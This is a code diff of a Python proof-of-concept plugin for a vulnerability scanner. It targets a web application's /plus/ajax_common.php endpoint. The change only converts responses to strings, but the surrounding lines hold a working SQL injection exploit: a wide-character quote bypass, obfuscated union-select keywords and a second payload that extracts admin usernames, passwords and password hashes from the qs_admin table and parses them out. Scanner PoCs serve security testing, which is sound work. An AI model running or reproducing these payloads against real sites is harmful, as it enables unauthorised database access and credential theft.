@@ -58,7 +58,7 @@ class Poc(ABPoc):
                 target=self.target) + "/plus/ajax_common.php?act=hotword&query=錦'%20a<>nd%201=2%20un<>ion%20sel<>ect%201,md5(736482),3%23"
             request = urllib.request.Request(verify_url)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             if '5cee14937d463a819651c8e1c504613c' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -79,7 +79,7 @@ class Poc(ABPoc):
                       "0x3a,pwd,0x3a,pwd_hash),3%20fr<>om%20qs_admin%23")
             request = urllib.request.Request(vul_url + paload)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             pattern = re.compile(
                 r'.*?\[\'(?P<username>[^<>]*?):(?P<password>[^<>]*?):(?P<pwdhash>[^<>]*?)\'\]', re.I | re.S)
             match = pattern.match(content)
